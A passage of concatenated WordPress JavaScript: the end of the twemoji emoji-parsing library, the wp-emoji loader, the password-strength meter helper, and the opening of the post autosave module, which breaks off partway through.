        g = /(?:\ud83d\udc68\ud83c\udffb\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc68\ud83c[\udffb-\udfff]|\ud83d\udc68\ud83c\udffc\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc68\ud83c[\udffb-\udfff]|\ud83d\udc68\ud83c\udffd\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc68\ud83c[\udffb-\udfff]|\ud83d\udc68\ud83c\udffe\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc68\ud83c[\udffb-\udfff]|\ud83d\udc68\ud83c\udfff\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc68\ud83c[\udffb-\udfff]|\ud83d\udc69\ud83c\udffb\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc68\ud83c[\udffb-\udfff]|\ud83d\udc69\ud83c\udffb\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc69\ud83c[\udffb-\udfff]|\ud83d\udc69\ud83c\udffc\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc68\ud83c[\udffb-\udfff]|\ud83d\udc69\ud83c\udffc\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc69\ud83c[\udffb-\udfff]|\ud83d\udc69\ud83c\udffd\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc68\ud83c[\udffb-\udfff]|\ud83d\udc69\ud83c\udffd\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc69\ud83c[\udffb-\udfff]|\ud83d\udc69\ud83c\udffe\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc68\ud83c[\udffb-\udfff]|\ud83d\udc69\ud83c\udffe\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc69\ud83c[\udffb-\udfff]|\ud83d\udc69\ud83c\udfff\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc68\ud83c[\udffb-\udfff]|\ud83d\udc69\ud83c\udfff\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc69\ud83c[\udffb-\udfff]|\ud83e\uddd1\ud83c\udffb\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83e\uddd1\ud83c[\udffc-\udfff]|\ud83e\uddd1\ud83c\udffc\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83e\uddd1\ud83c[\udffb\udffd-\udfff]|\ud83e\uddd1\ud83c\udffd\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83e\uddd1\ud83c[\udffb\udffc\udffe\udfff]|\ud83e\uddd1\ud83c\udffe\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83e\uddd1\ud83c[\udffb-\udffd\udfff]|\ud83e\uddd1\ud83c\udfff\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83e\uddd1\ud83c[\udffb-\udffe]|\ud83d\udc68\ud83c\udffb\u200d\u2764\ufe0f\u200d\ud83d\udc68\ud83c[\udffb-\udfff]|\ud83d\udc68\ud83c\udffb\u200d\ud83e\udd1d\u200d\ud83d\udc68\ud83c[\udffc-\udfff]|\ud83d\udc68\ud83c\udffc\u200d\u2764\ufe0f\u200d\ud83d\udc68\ud83c[\udffb-\udfff]|\ud83d\udc68\ud83c\udffc\u200d\ud83e\udd1d\u200d\ud83d\udc68\ud83c[\udffb\udffd-\udfff]|\ud83d\udc68\ud83c\udffd\u200d\u2764\ufe0f\u200d\ud83d\udc68\ud83c[\udffb-\udfff]|\ud83d\udc68\ud83c\udffd\u200d\ud83e\udd1d\u200d\ud83d\udc68\ud83c[\udffb\udffc\udffe\udfff]|\ud83d\udc68\ud83c\udffe\u200d\u2764\ufe0f\u200d\ud83d\udc68\ud83c[\udffb-\udfff]|\ud83d\udc68\ud83c\udffe\u200d\ud83e\udd1d\u200d\ud83d\udc68\ud83c[\udffb-\udffd\udfff]|\ud83d\udc68\ud83c\udfff\u200d\u2764\ufe0f\u200d\ud83d\udc68\ud83c[\udffb-\udfff]|\ud83d\udc68\ud83c\udfff\u200d\ud83e\udd1d\u200d\ud83d\udc68\ud83c[\udffb-\udffe]|\ud83d\udc69\ud83c\udffb\u200d\u2764\ufe0f\u200d\ud83d\udc68\ud83c[\udffb-\udfff]|\ud83d\udc69\ud83c\udffb\u200d\u2764\ufe0f\u200d\ud83d\udc69\ud83c[\udffb-\udfff]|\ud83d\udc69\ud83c\udffb\u200d\ud83e\udd1d\u200d\ud83d\udc68\ud83c[\udffc-\udfff]|\ud83d\udc69\ud83c\udffb\u200d\ud83e\udd1d\u200d\ud83d\udc69\ud83c[\udffc-\udfff]|\ud83d\udc69\ud83c\udffc\u200d\u2764\ufe0f\u200d\ud83d\udc68\ud83c[\udffb-\udfff]|\ud83d\udc69\ud83c\udffc\u200d\u2764\ufe0f\u200d\ud83d\udc69\ud83c[\udffb-\udfff]|\ud83d\udc69\ud83c\udffc\u200d\ud83e\udd1d\u200d\ud83d\udc68\ud83c[\udffb\udffd-\udfff]|\ud83d\udc69\ud83c\udffc\u200d\ud83e\udd1d\u200d\ud83d\udc69\ud83c[\udffb\udffd-\udfff]|\ud83d\udc69\ud83c\udffd\u200d\u2764\ufe0f\u200d\ud83d\udc68\ud83c[\udffb-\udfff]|\ud83d\udc69\ud83c\udffd\u200d\u2764\ufe0f\u200d\ud83d\udc69\ud83c[\udffb-\udfff]|\ud83d\udc69\ud83c\udffd\u200d\ud83e\udd1d\u200d\ud83d\udc68\ud83c[\udffb\udffc\udffe\udfff]|\ud83d\udc69\ud83c\udffd\u200d\ud83e\udd1d\u200d\ud83d\udc69\ud83c[\udffb\udffc\udffe\udfff]|\ud83d\udc69\ud83c\udffe\u200d\u2764\ufe0f\u200d\ud83d\udc68\ud83c[\udffb-\udfff]|\ud83d\udc69\ud83c\udffe\u200d\u2764\ufe0f\u200d\ud83d\udc69\ud83c[\udffb-\udfff]|\ud83d\udc69\ud83c\udffe\u200d\ud83e\udd1d\u200d\ud83d\udc68\ud83c[\udffb-\udffd\udfff]|\ud83d\udc69\ud83c\udffe\u200d\ud83e\udd1d\u200d\ud83d\udc69\ud83c[\udffb-\udffd\udfff]|\ud83d\udc69\ud83c\udfff\u200d\u2764\ufe0f\u200d\ud83d\udc68\ud83c[\udffb-\udfff]|\ud83d\udc69\ud83c\udfff\u200d\u2764\ufe0f\u200d\ud83d\udc69\ud83c[\udffb-\udfff]|\ud83d\udc69\ud83c\udfff\u200d\ud83e\udd1d\u200d\ud83d\udc68\ud83c[\udffb-\udffe]|\ud83d\udc69\ud83c\udfff\u200d\ud83e\udd1d\u200d\ud83d\udc69\ud83c[\udffb-\udffe]|\ud83e\uddd1\ud83c\udffb\u200d\u2764\ufe0f\u200d\ud83e\uddd1\ud83c[\udffc-\udfff]|\ud83e\uddd1\ud83c\udffb\u200d\ud83e\udd1d\u200d\ud83e\uddd1\ud83c[\udffb-\udfff]|\ud83e\uddd1\ud83c\udffc\u200d\u2764\ufe0f\u200d\ud83e\uddd1\ud83c[\udffb\udffd-\udfff]|\ud83e\uddd1\ud83c\udffc\u200d\ud83e\udd1d\u200d\ud83e\uddd1\ud83c[\udffb-\udfff]|\ud83e\uddd1\ud83c\udffd\u200d\u2764\ufe0f\u200d\ud83e\uddd1\ud83c[\udffb\udffc\udffe\udfff]|\ud83e\uddd1\ud83c\udffd\u200d\ud83e\udd1d\u200d\ud83e\uddd1\ud83c[\udffb-\udfff]|\ud83e\uddd1\ud83c\udffe\u200d\u2764\ufe0f\u200d\ud83e\uddd1\ud83c[\udffb-\udffd\udfff]|\ud83e\uddd1\ud83c\udffe\u200d\ud83e\udd1d\u200d\ud83e\uddd1\ud83c[\udffb-\udfff]|\ud83e\uddd1\ud83c\udfff\u200d\u2764\ufe0f\u200d\ud83e\uddd1\ud83c[\udffb-\udffe]|\ud83e\uddd1\ud83c\udfff\u200d\ud83e\udd1d\u200d\ud83e\uddd1\ud83c[\udffb-\udfff]|\ud83d\udc68\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc68|\ud83d\udc69\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d[\udc68\udc69]|\ud83e\udef1\ud83c\udffb\u200d\ud83e\udef2\ud83c[\udffc-\udfff]|\ud83e\udef1\ud83c\udffc\u200d\ud83e\udef2\ud83c[\udffb\udffd-\udfff]|\ud83e\udef1\ud83c\udffd\u200d\ud83e\udef2\ud83c[\udffb\udffc\udffe\udfff]|\ud83e\udef1\ud83c\udffe\u200d\ud83e\udef2\ud83c[\udffb-\udffd\udfff]|\ud83e\udef1\ud83c\udfff\u200d\ud83e\udef2\ud83c[\udffb-\udffe]|\ud83d\udc68\u200d\u2764\ufe0f\u200d\ud83d\udc68|\ud83d\udc69\u200d\u2764\ufe0f\u200d\ud83d[\udc68\udc69]|\ud83e\uddd1\u200d\ud83e\udd1d\u200d\ud83e\uddd1|\ud83d\udc6b\ud83c[\udffb-\udfff]|\ud83d\udc6c\ud83c[\udffb-\udfff]|\ud83d\udc6d\ud83c[\udffb-\udfff]|\ud83d\udc8f\ud83c[\udffb-\udfff]|\ud83d\udc91\ud83c[\udffb-\udfff]|\ud83e\udd1d\ud83c[\udffb-\udfff]|\ud83d[\udc6b-\udc6d\udc8f\udc91]|\ud83e\udd1d)|(?:\ud83d[\udc68\udc69]|\ud83e\uddd1)(?:\ud83c[\udffb-\udfff])?\u200d(?:\u2695\ufe0f|\u2696\ufe0f|\u2708\ufe0f|\ud83c[\udf3e\udf73\udf7c\udf84\udf93\udfa4\udfa8\udfeb\udfed]|\ud83d[\udcbb\udcbc\udd27\udd2c\ude80\ude92]|\ud83e[\uddaf-\uddb3\uddbc\uddbd])|(?:\ud83c[\udfcb\udfcc]|\ud83d[\udd74\udd75]|\u26f9)((?:\ud83c[\udffb-\udfff]|\ufe0f)\u200d[\u2640\u2642]\ufe0f)|(?:\ud83c[\udfc3\udfc4\udfca]|\ud83d[\udc6e\udc70\udc71\udc73\udc77\udc81\udc82\udc86\udc87\ude45-\ude47\ude4b\ude4d\ude4e\udea3\udeb4-\udeb6]|\ud83e[\udd26\udd35\udd37-\udd39\udd3d\udd3e\uddb8\uddb9\uddcd-\uddcf\uddd4\uddd6-\udddd])(?:\ud83c[\udffb-\udfff])?\u200d[\u2640\u2642]\ufe0f|(?:\ud83d\udc68\u200d\ud83d\udc68\u200d\ud83d\udc66\u200d\ud83d\udc66|\ud83d\udc68\u200d\ud83d\udc68\u200d\ud83d\udc67\u200d\ud83d[\udc66\udc67]|\ud83d\udc68\u200d\ud83d\udc69\u200d\ud83d\udc66\u200d\ud83d\udc66|\ud83d\udc68\u200d\ud83d\udc69\u200d\ud83d\udc67\u200d\ud83d[\udc66\udc67]|\ud83d\udc69\u200d\ud83d\udc69\u200d\ud83d\udc66\u200d\ud83d\udc66|\ud83d\udc69\u200d\ud83d\udc69\u200d\ud83d\udc67\u200d\ud83d[\udc66\udc67]|\ud83d\udc68\u200d\ud83d\udc66\u200d\ud83d\udc66|\ud83d\udc68\u200d\ud83d\udc67\u200d\ud83d[\udc66\udc67]|\ud83d\udc68\u200d\ud83d\udc68\u200d\ud83d[\udc66\udc67]|\ud83d\udc68\u200d\ud83d\udc69\u200d\ud83d[\udc66\udc67]|\ud83d\udc69\u200d\ud83d\udc66\u200d\ud83d\udc66|\ud83d\udc69\u200d\ud83d\udc67\u200d\ud83d[\udc66\udc67]|\ud83d\udc69\u200d\ud83d\udc69\u200d\ud83d[\udc66\udc67]|\ud83c\udff3\ufe0f\u200d\u26a7\ufe0f|\ud83c\udff3\ufe0f\u200d\ud83c\udf08|\ud83d\ude36\u200d\ud83c\udf2b\ufe0f|\u2764\ufe0f\u200d\ud83d\udd25|\u2764\ufe0f\u200d\ud83e\ude79|\ud83c\udff4\u200d\u2620\ufe0f|\ud83d\udc15\u200d\ud83e\uddba|\ud83d\udc3b\u200d\u2744\ufe0f|\ud83d\udc41\u200d\ud83d\udde8|\ud83d\udc68\u200d\ud83d[\udc66\udc67]|\ud83d\udc69\u200d\ud83d[\udc66\udc67]|\ud83d\udc6f\u200d\u2640\ufe0f|\ud83d\udc6f\u200d\u2642\ufe0f|\ud83d\ude2e\u200d\ud83d\udca8|\ud83d\ude35\u200d\ud83d\udcab|\ud83e\udd3c\u200d\u2640\ufe0f|\ud83e\udd3c\u200d\u2642\ufe0f|\ud83e\uddde\u200d\u2640\ufe0f|\ud83e\uddde\u200d\u2642\ufe0f|\ud83e\udddf\u200d\u2640\ufe0f|\ud83e\udddf\u200d\u2642\ufe0f|\ud83d\udc08\u200d\u2b1b|\ud83d\udc26\u200d\u2b1b)|[#*0-9]\ufe0f?\u20e3|(?:[\xa9\xae\u2122\u265f]\ufe0f)|(?:\ud83c[\udc04\udd70\udd71\udd7e\udd7f\ude02\ude1a\ude2f\ude37\udf21\udf24-\udf2c\udf36\udf7d\udf96\udf97\udf99-\udf9b\udf9e\udf9f\udfcd\udfce\udfd4-\udfdf\udff3\udff5\udff7]|\ud83d[\udc3f\udc41\udcfd\udd49\udd4a\udd6f\udd70\udd73\udd76-\udd79\udd87\udd8a-\udd8d\udda5\udda8\uddb1\uddb2\uddbc\uddc2-\uddc4\uddd1-\uddd3\udddc-\uddde\udde1\udde3\udde8\uddef\uddf3\uddfa\udecb\udecd-\udecf\udee0-\udee5\udee9\udef0\udef3]|[\u203c\u2049\u2139\u2194-\u2199\u21a9\u21aa\u231a\u231b\u2328\u23cf\u23ed-\u23ef\u23f1\u23f2\u23f8-\u23fa\u24c2\u25aa\u25ab\u25b6\u25c0\u25fb-\u25fe\u2600-\u2604\u260e\u2611\u2614\u2615\u2618\u2620\u2622\u2623\u2626\u262a\u262e\u262f\u2638-\u263a\u2640\u2642\u2648-\u2653\u2660\u2663\u2665\u2666\u2668\u267b\u267f\u2692-\u2697\u2699\u269b\u269c\u26a0\u26a1\u26a7\u26aa\u26ab\u26b0\u26b1\u26bd\u26be\u26c4\u26c5\u26c8\u26cf\u26d1\u26d3\u26d4\u26e9\u26ea\u26f0-\u26f5\u26f8\u26fa\u26fd\u2702\u2708\u2709\u270f\u2712\u2714\u2716\u271d\u2721\u2733\u2734\u2744\u2747\u2757\u2763\u2764\u27a1\u2934\u2935\u2b05-\u2b07\u2b1b\u2b1c\u2b50\u2b55\u3030\u303d\u3297\u3299])(?:\ufe0f|(?!\ufe0e))|(?:(?:\ud83c[\udfcb\udfcc]|\ud83d[\udd74\udd75\udd90]|\ud83e\udef0|[\u261d\u26f7\u26f9\u270c\u270d])(?:\ufe0f|(?!\ufe0e))|(?:\ud83c[\udf85\udfc2-\udfc4\udfc7\udfca]|\ud83d[\udc42\udc43\udc46-\udc50\udc66-\udc69\udc6e\udc70-\udc78\udc7c\udc81-\udc83\udc85-\udc87\udcaa\udd7a\udd95\udd96\ude45-\ude47\ude4b-\ude4f\udea3\udeb4-\udeb6\udec0\udecc]|\ud83e[\udd0c\udd0f\udd18-\udd1c\udd1e\udd1f\udd26\udd30-\udd39\udd3d\udd3e\udd77\uddb5\uddb6\uddb8\uddb9\uddbb\uddcd-\uddcf\uddd1-\udddd\udec3-\udec5\udef1-\udef8]|[\u270a\u270b]))(?:\ud83c[\udffb-\udfff])?|(?:\ud83c\udff4\udb40\udc67\udb40\udc62\udb40\udc65\udb40\udc6e\udb40\udc67\udb40\udc7f|\ud83c\udff4\udb40\udc67\udb40\udc62\udb40\udc73\udb40\udc63\udb40\udc74\udb40\udc7f|\ud83c\udff4\udb40\udc67\udb40\udc62\udb40\udc77\udb40\udc6c\udb40\udc73\udb40\udc7f|\ud83c\udde6\ud83c[\udde8-\uddec\uddee\uddf1\uddf2\uddf4\uddf6-\uddfa\uddfc\uddfd\uddff]|\ud83c\udde7\ud83c[\udde6\udde7\udde9-\uddef\uddf1-\uddf4\uddf6-\uddf9\uddfb\uddfc\uddfe\uddff]|\ud83c\udde8\ud83c[\udde6\udde8\udde9\uddeb-\uddee\uddf0-\uddf5\uddf7\uddfa-\uddff]|\ud83c\udde9\ud83c[\uddea\uddec\uddef\uddf0\uddf2\uddf4\uddff]|\ud83c\uddea\ud83c[\udde6\udde8\uddea\uddec\udded\uddf7-\uddfa]|\ud83c\uddeb\ud83c[\uddee-\uddf0\uddf2\uddf4\uddf7]|\ud83c\uddec\ud83c[\udde6\udde7\udde9-\uddee\uddf1-\uddf3\uddf5-\uddfa\uddfc\uddfe]|\ud83c\udded\ud83c[\uddf0\uddf2\uddf3\uddf7\uddf9\uddfa]|\ud83c\uddee\ud83c[\udde8-\uddea\uddf1-\uddf4\uddf6-\uddf9]|\ud83c\uddef\ud83c[\uddea\uddf2\uddf4\uddf5]|\ud83c\uddf0\ud83c[\uddea\uddec-\uddee\uddf2\uddf3\uddf5\uddf7\uddfc\uddfe\uddff]|\ud83c\uddf1\ud83c[\udde6-\udde8\uddee\uddf0\uddf7-\uddfb\uddfe]|\ud83c\uddf2\ud83c[\udde6\udde8-\udded\uddf0-\uddff]|\ud83c\uddf3\ud83c[\udde6\udde8\uddea-\uddec\uddee\uddf1\uddf4\uddf5\uddf7\uddfa\uddff]|\ud83c\uddf4\ud83c\uddf2|\ud83c\uddf5\ud83c[\udde6\uddea-\udded\uddf0-\uddf3\uddf7-\uddf9\uddfc\uddfe]|\ud83c\uddf6\ud83c\udde6|\ud83c\uddf7\ud83c[\uddea\uddf4\uddf8\uddfa\uddfc]|\ud83c\uddf8\ud83c[\udde6-\uddea\uddec-\uddf4\uddf7-\uddf9\uddfb\uddfd-\uddff]|\ud83c\uddf9\ud83c[\udde6\udde8\udde9\uddeb-\udded\uddef-\uddf4\uddf7\uddf9\uddfb\uddfc\uddff]|\ud83c\uddfa\ud83c[\udde6\uddec\uddf2\uddf3\uddf8\uddfe\uddff]|\ud83c\uddfb\ud83c[\udde6\udde8\uddea\uddec\uddee\uddf3\uddfa]|\ud83c\uddfc\ud83c[\uddeb\uddf8]|\ud83c\uddfd\ud83c\uddf0|\ud83c\uddfe\ud83c[\uddea\uddf9]|\ud83c\uddff\ud83c[\udde6\uddf2\uddfc]|\ud83c[\udccf\udd8e\udd91-\udd9a\udde6-\uddff\ude01\ude32-\ude36\ude38-\ude3a\ude50\ude51\udf00-\udf20\udf2d-\udf35\udf37-\udf7c\udf7e-\udf84\udf86-\udf93\udfa0-\udfc1\udfc5\udfc6\udfc8\udfc9\udfcf-\udfd3\udfe0-\udff0\udff4\udff8-\udfff]|\ud83d[\udc00-\udc3e\udc40\udc44\udc45\udc51-\udc65\udc6a\udc6f\udc79-\udc7b\udc7d-\udc80\udc84\udc88-\udc8e\udc90\udc92-\udca9\udcab-\udcfc\udcff-\udd3d\udd4b-\udd4e\udd50-\udd67\udda4\uddfb-\ude44\ude48-\ude4a\ude80-\udea2\udea4-\udeb3\udeb7-\udebf\udec1-\udec5\uded0-\uded2\uded5-\uded7\udedc-\udedf\udeeb\udeec\udef4-\udefc\udfe0-\udfeb\udff0]|\ud83e[\udd0d\udd0e\udd10-\udd17\udd20-\udd25\udd27-\udd2f\udd3a\udd3c\udd3f-\udd45\udd47-\udd76\udd78-\uddb4\uddb7\uddba\uddbc-\uddcc\uddd0\uddde-\uddff\ude70-\ude7c\ude80-\ude88\ude90-\udebd\udebf-\udec2\udece-\udedb\udee0-\udee8]|[\u23e9-\u23ec\u23f0\u23f3\u267e\u26ce\u2705\u2728\u274c\u274e\u2753-\u2755\u2795-\u2797\u27b0\u27bf\ue50a])|\ufe0f/g,
        f = /\uFE0F/g,
        c = String.fromCharCode(8205),
        t = /[&<>'"]/g,
        m = /^(?:iframe|noframes|noscript|script|select|style|textarea)$/,
        e = String.fromCharCode;
    return h;

    function x(d, u) {
        return document.createTextNode(u ? d.replace(f, "") : d)
    }

    function b(d, u) {
        return "".concat(u.base, u.size, "/", d, u.ext)
    }

    function N(d) {
        return o(d.indexOf(c) < 0 ? d.replace(f, "") : d)
    }

    function r(d) {
        return u[d]
    }

    function a() {
        return null
    }

    function n(d, u) {
        return String(d).replace(g, u)
    }

    function o(d, u) {
        for (var f = [], c = 0, e = 0, b = 0; b < d.length;) c = d.charCodeAt(b++), e ? (f.push((65536 + (e - 55296 << 10) + (c - 56320)).toString(16)), e = 0) : 55296 <= c && c <= 56319 ? e = c : f.push(c.toString(16));
        return f.join(u || "-")
    }
}();
// Source: wp-includes/js/wp-emoji.min.js
! function(c, l) {
    c.wp = c.wp || {}, c.wp.emoji = new function() {
        var n, u, e = c.MutationObserver || c.WebKitMutationObserver || c.MozMutationObserver,
            a = c.document,
            t = !1,
            r = 0,
            o = 0 < c.navigator.userAgent.indexOf("Trident/7.0");

        function i() {
            return !a.implementation.hasFeature || a.implementation.hasFeature("http://www.w3.org/TR/SVG11/feature#Image", "1.1")
        }

        function s() {
            if (!t) {
                if (void 0 === c.twemoji) return 600 < r ? void 0 : (c.clearTimeout(u), u = c.setTimeout(s, 50), void r++);
                n = c.twemoji, t = !0, e && new e(function(u) {
                    for (var e, t, n, a, r = u.length; r--;) {
                        if (e = u[r].addedNodes, t = u[r].removedNodes, 1 === (n = e.length) && 1 === t.length && 3 === e[0].nodeType && "IMG" === t[0].nodeName && e[0].data === t[0].alt && "load-failed" === t[0].getAttribute("data-error")) return;
                        for (; n--;) {
                            if (3 === (a = e[n]).nodeType) {
                                if (!a.parentNode) continue;
                                if (o)
                                    for (; a.nextSibling && 3 === a.nextSibling.nodeType;) a.nodeValue = a.nodeValue + a.nextSibling.nodeValue, a.parentNode.removeChild(a.nextSibling);
                                a = a.parentNode
                            }
                            d(a.textContent) && f(a)
                        }
                    }
                }).observe(a.body, {
                    childList: !0,
                    subtree: !0
                }), f(a.body)
            }
        }

        function d(u) {
            return !!u && (/[\uDC00-\uDFFF]/.test(u) || /[\u203C\u2049\u20E3\u2122\u2139\u2194-\u2199\u21A9\u21AA\u2300\u231A\u231B\u2328\u2388\u23CF\u23E9-\u23F3\u23F8-\u23FA\u24C2\u25AA\u25AB\u25B6\u25C0\u25FB-\u25FE\u2600-\u2604\u260E\u2611\u2614\u2615\u2618\u261D\u2620\u2622\u2623\u2626\u262A\u262E\u262F\u2638\u2639\u263A\u2648-\u2653\u2660\u2663\u2665\u2666\u2668\u267B\u267F\u2692\u2693\u2694\u2696\u2697\u2699\u269B\u269C\u26A0\u26A1\u26AA\u26AB\u26B0\u26B1\u26BD\u26BE\u26C4\u26C5\u26C8\u26CE\u26CF\u26D1\u26D3\u26D4\u26E9\u26EA\u26F0-\u26F5\u26F7-\u26FA\u26FD\u2702\u2705\u2708-\u270D\u270F\u2712\u2714\u2716\u271D\u2721\u2728\u2733\u2734\u2744\u2747\u274C\u274E\u2753\u2754\u2755\u2757\u2763\u2764\u2795\u2796\u2797\u27A1\u27B0\u27BF\u2934\u2935\u2B05\u2B06\u2B07\u2B1B\u2B1C\u2B50\u2B55\u3030\u303D\u3297\u3299]/.test(u))
        }

        function f(u, e) {
            var t;
            return !l.supports.everything && n && u && ("string" == typeof u || u.childNodes && u.childNodes.length) ? (e = e || {}, t = {
                base: i() ? l.svgUrl : l.baseUrl,
                ext: i() ? l.svgExt : l.ext,
                className: e.className || "emoji",
                callback: function(u, e) {
                    switch (u) {
                        case "a9":
                        case "ae":
                        case "2122":
                        case "2194":
                        case "2660":
                        case "2663":
                        case "2665":
                        case "2666":
                            return !1
                    }
                    return !(l.supports.everythingExceptFlag && !/^1f1(?:e[6-9a-f]|f[0-9a-f])-1f1(?:e[6-9a-f]|f[0-9a-f])$/.test(u) && !/^(1f3f3-fe0f-200d-1f308|1f3f4-200d-2620-fe0f)$/.test(u)) && "".concat(e.base, u, e.ext)
                },
                attributes: function() {
                    return {
                        role: "img"
                    }
                },
                onerror: function() {
                    n.parentNode && (this.setAttribute("data-error", "load-failed"), n.parentNode.replaceChild(a.createTextNode(n.alt), n))
                },
                doNotParse: function(u) {
                    return !(!u || !u.className || "string" != typeof u.className || -1 === u.className.indexOf("wp-exclude-emoji"))
                }
            }, "object" == typeof e.imgAttr && (t.attributes = function() {
                return e.imgAttr
            }), n.parse(u, t)) : u
        }
        return l && (l.DOMReady ? s() : l.readyCallback = s), {
            parse: f,
            test: d
        }
    }
}(window, window._wpemojiSettings);
window.wp = window.wp || {},
    function(a) {
        var e = wp.i18n.__,
            n = wp.i18n.sprintf;
        wp.passwordStrength = {
            meter: function(e, n, t) {
                return Array.isArray(n) || (n = [n.toString()]), e != t && t && 0 < t.length ? 5 : void 0 === window.zxcvbn ? -1 : zxcvbn(e, n).score
            },
            userInputBlacklist: function() {
                return window.console.log(n(e("%1$s is deprecated since version %2$s! Use %3$s instead. Please consider writing more inclusive code."), "wp.passwordStrength.userInputBlacklist()", "5.5.0", "wp.passwordStrength.userInputDisallowedList()")), wp.passwordStrength.userInputDisallowedList()
            },
            userInputDisallowedList: function() {
                var e, n, t, r, s = [],
                    i = [],
                    o = ["user_login", "first_name", "last_name", "nickname", "display_name", "email", "url", "description", "weblog_title", "admin_email"];
                for (s.push(document.title), s.push(document.URL), n = o.length, e = 0; e < n; e++) 0 !== (r = a("#" + o[e])).length && (s.push(r[0].defaultValue), s.push(r.val()));
                for (t = s.length, e = 0; e < t; e++) s[e] && (i = i.concat(s[e].replace(/\W/g, " ").split(" ")));
                return i = a.grep(i, function(e, n) {
                    return !("" === e || e.length < 4) && a.inArray(e, i) === n
                })
            }
        }, window.passwordStrength = wp.passwordStrength.meter
    }(jQuery);


/**
 * @output wp-includes/js/autosave.js
 */

/* global tinymce, wpCookies, autosaveL10n, switchEditors */
// Back-compat.
window.autosave = function() {
	return true;
};

/**
 * Adds autosave to the window object on dom ready.
 *
 * @since 3.9.0
 *
 * @param {jQuery} $ jQuery object.
 * @param {window} The window object.
 *
 */
( function( $, window ) {
	/**
	 * Auto saves the post.
	 *
	 * @since 3.9.0
	 *
	 * @return {Object}
	 * 	{{
	 * 		getPostData: getPostData,
	 * 		getCompareString: getCompareString,
	 * 		disableButtons: disableButtons,
	 * 		enableButtons: enableButtons,
	 * 		local: ({hasStorage, getSavedPostData, save, suspend, resume}|*),
	 * 		server: ({tempBlockSave, triggerSave, postChanged, suspend, resume}|*)
	 * 	}}
	 * 	The object with all functions for autosave.
	 */
	function autosave() {
		var initialCompareString,
			initialCompareData = {},
			lastTriggerSave    = 0,
			$document          = $( document );

		/**
		 * Sets the initial compare data.
		 *
		 * @since 5.6.1
		 */
		function setInitialCompare() {
			initialCompareData = {
				post_title: $( '#title' ).val() || '',
				content: $( '#content' ).val() || '',
				excerpt: $( '#excerpt' ).val() || ''
			};

			initialCompareString = getCompareString( initialCompareData );
		}

		/**
		 * Returns the data saved in both local and remote autosave.
		 *
		 * @since 3.9.0
		 *
		 * @param {string} type The type of autosave either local or remote.
		 *
		 * @return {Object} Object containing the post data.
		 */
		function getPostData( type ) {
			var post_name, parent_id, data,
				time = ( new Date() ).getTime(),
				cats = [],
				editor = getEditor();

			// Don't run editor.save() more often than every 3 seconds.
			// It is resource intensive and might slow down typing in long posts on slow devices.
			if ( editor && editor.isDirty() && ! editor.isHidden() && time - 3000 > lastTriggerSave ) {
				editor.save();
				lastTriggerSave = time;
			}

			data = {
				post_id: $( '#post_ID' ).val() || 0,
				post_type: $( '#post_type' ).val() || '',
				post_author: $( '#post_author' ).val() || '',
				post_title: $( '#title' ).val() || '',
				content: $( '#content' ).val() || '',
				excerpt: $( '#excerpt' ).val() || ''
			};

			if ( type === 'local' ) {
				return data;
			}

			$( 'input[id^="in-category-"]:checked' ).each( function() {
				cats.push( this.value );
			});
			data.catslist = cats.join(',');

			if ( post_name = $( '#post_name' ).val() ) {
				data.post_name = post_name;
			}

			if ( parent_id = $( '#parent_id' ).val() ) {
				data.parent_id = parent_id;
			}

			if ( $( '#comment_status' ).prop( 'checked' ) ) {
				data.comment_status = 'open';
			}

			if ( $( '#ping_status' ).prop( 'checked' ) ) {
				data.ping_status = 'open';
			}

			if ( $( '#auto_draft' ).val() === '1' ) {
				data.auto_draft = '1';
			}

			return data;
		}

		/**
		 * Concatenates the title, content and excerpt. This is used to track changes
		 * when auto-saving.
		 *
		 * @since 3.9.0
		 *
		 * @param {Object} postData The object containing the post data.
		 *
		 * @return {string} A concatenated string with title, content and excerpt.
		 */
		function getCompareString( postData ) {
			if ( typeof postData === 'object' ) {
				return ( postData.post_title || '' ) + '::' + ( postData.content || '' ) + '::' + ( postData.excerpt || '' );
			}

			return ( $('#title').val() || '' ) + '::' + ( $('#content').val() || '' ) + '::' + ( $('#excerpt').val() || '' );
		}

		/**
		 * Disables save buttons.
		 *
		 * @since 3.9.0
		 *
		 * @return {void}
		 */
		function disableButtons() {
			$document.trigger('autosave-disable-buttons');

			// Re-enable 5 sec later. Just gives autosave a head start to avoid collisions.
			setTimeout( enableButtons, 5000 );
		}

		/**
		 * Enables save buttons.
		 *
		 * @since 3.9.0
		 *
		 * @return {void}
		 */
		function enableButtons() {
			$document.trigger( 'autosave-enable-buttons' );
		}

		/**
		 * Gets the content editor.
		 *
		 * @since 4.6.0
		 *
		 * @return {boolean|*} Returns either false if the editor is undefined,
		 *                     or the instance of the content editor.
		 */
		function getEditor() {
			return typeof tinymce !== 'undefined' && tinymce.get('content');
		}

		/**
		 * Autosave in localStorage.
		 *
		 * @since 3.9.0
		 *
		 * @return {
		 * {
		 * 	hasStorage: *,
		 * 	getSavedPostData: getSavedPostData,
		 * 	save: save,
		 * 	suspend: suspend,
		 * 	resume: resume
		 * 	}
		 * }
		 * The object with all functions for local storage autosave.
		 */
		function autosaveLocal() {
